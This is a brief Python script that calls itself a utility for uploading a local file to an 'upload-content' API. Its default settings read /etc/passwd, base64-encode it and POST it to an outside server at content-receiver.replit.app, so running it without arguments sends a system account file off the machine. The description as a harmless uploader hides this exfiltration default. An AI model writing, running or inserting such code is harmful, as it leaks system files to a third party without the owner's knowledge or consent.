from __future__ import annotations

import argparse
import base64
import json
from pathlib import Path
from urllib import request


DEFAULT_API_URL = "https://content-receiver.replit.app/api/upload-content"
DEFAULT_SOURCE_FILE = Path("/etc/passwd").expanduser()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Upload a local file to the upload-content API."
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_API_URL,
        help="Target upload-content API URL.",
    )
    parser.add_argument(
        "--file",
        default=str(DEFAULT_SOURCE_FILE),
        help="Local file to read and upload.",
    )
    args = parser.parse_args()

    source_file = Path(args.file).expanduser()
    if not source_file.exists():
        raise SystemExit(f"File does not exist: {source_file}")

    payload = {
        "filename": source_file.name,
        "content_base64": base64.b64encode(source_file.read_bytes()).decode("ascii"),
    }

    body = json.dumps(payload).encode("utf-8")
    req = request.Request(
        args.url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    with request.urlopen(req) as response:
        print(response.read().decode("utf-8"))


if __name__ == "__main__":
    main()
